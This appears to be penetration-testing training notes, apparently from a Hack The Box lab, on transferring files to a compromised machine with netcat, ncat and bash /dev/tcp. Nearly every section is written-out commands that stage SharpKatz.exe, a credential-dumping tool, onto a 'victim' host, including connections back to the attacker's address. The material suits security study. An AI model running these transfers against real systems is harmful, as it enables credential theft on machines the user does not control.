# Miscellaneous File Transfer Methods

File Transfer with Netcat and Ncat

## Netcat

### NetCat - Compromised Machine - Listening on Port 8000
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.

### Ncat - Compromised Machine - Listening on Port 8000
```
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

### Netcat - Attack Host - Sending File to Compromised machine
```
DaleDunlop@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
DaleDunlop@htb[/htb]$ # Example using Original Netcat
DaleDunlop@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

If we use Ncat in our attack host, we can use --send-only instead of -q. --send-only in both connect and listen modes causes Ncat to quit when its input runs out. Usually, it will not stop until the network connection is closed because the remote side may still send something, but in the case of --send-only, there's no reason to receive anything more.

### Ncat - Attack Host - Sending File to Compromised machine
```
DaleDunlop@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
DaleDunlop@htb[/htb]$ # Example using Ncat
DaleDunlop@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.

### Attack Host - Sending File as Input to Netcat
```
DaleDunlop@htb[/htb]$ # Example using Original Netcat
DaleDunlop@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
### Compromised Machine Connect to Netcat to Receive the File
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

### Attack Host - Sending File as Input to Ncat
```
DaleDunlop@htb[/htb]$ # Example using Ncat
DaleDunlop@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
### Compromised Machine Connect to Ncat to Receive the File
```
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.
Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.

## NettCat - Sending File as Input to Netcat
```
DaleDunlop@htb[/htb]$ # Example using Original Netcat
DaleDunlop@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
### Ncat - Sending File as Input to Netcat
```
DaleDunlop@htb[/htb]$ # Example using Ncat
DaleDunlop@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
```
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

